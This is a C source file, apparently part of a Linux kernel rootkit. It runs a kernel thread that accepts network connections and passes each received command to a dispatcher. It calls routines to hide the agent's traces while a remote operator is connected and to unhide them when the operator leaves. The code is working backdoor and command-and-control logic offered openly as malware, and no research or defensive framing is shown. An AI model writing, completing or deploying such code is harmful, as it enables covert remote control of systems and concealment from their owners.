// SPDX-License-Identifier: GPL-2.0
#include "rootkit.h"

static void rk_handle_client(struct socket *client)
{
	char buf[RK_BUF_MAX];
	int n;

	while (!kthread_should_stop()) {
		memset(buf, 0, sizeof(buf));
		n = rk_recv(client, buf, sizeof(buf) - 1);
		if (n <= 0)
			break;
		buf[n] = '\0';
		rk_dispatch(client, buf);
	}
}

int rk_agent_thread(void *data)
{
	struct socket *client = NULL;
	int error;

	while (!kthread_should_stop()) {
		error = kernel_accept(rk_listen_sock, &client, 0);
		if (error < 0)
			break;

		/* Auto-hide agent traces on connect */
		rk_auto_hide(client);

		rk_handle_client(client);

		/* Remove auto-hidden traces on disconnect */
		rk_auto_unhide();

		sock_release(client);
		client = NULL;
	}
	return 0;
}
